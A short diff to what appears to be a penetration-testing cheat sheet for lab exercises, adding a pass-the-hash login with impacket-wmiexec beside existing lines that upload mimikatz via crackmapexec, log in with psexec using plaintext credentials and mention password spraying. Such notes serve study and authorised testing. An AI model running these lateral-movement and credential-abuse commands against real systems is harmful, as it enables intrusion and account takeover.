@@ -878,6 +878,9 @@ crackmapexec mssql 172.16.X.X -u USER -p PASS --put-file mimikatz.exe C:\\Users\
 #login to SMB command line with active creds
 impacket-psexec medtech/joe:'Flowers1'@172.16.203.11
 
+#login with hash
+impacket-wmiexec -hashes :4979d69d4ca66955c075c41cf45f24dc tom_admin@10.10.63.152
+
 
 #Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.
 
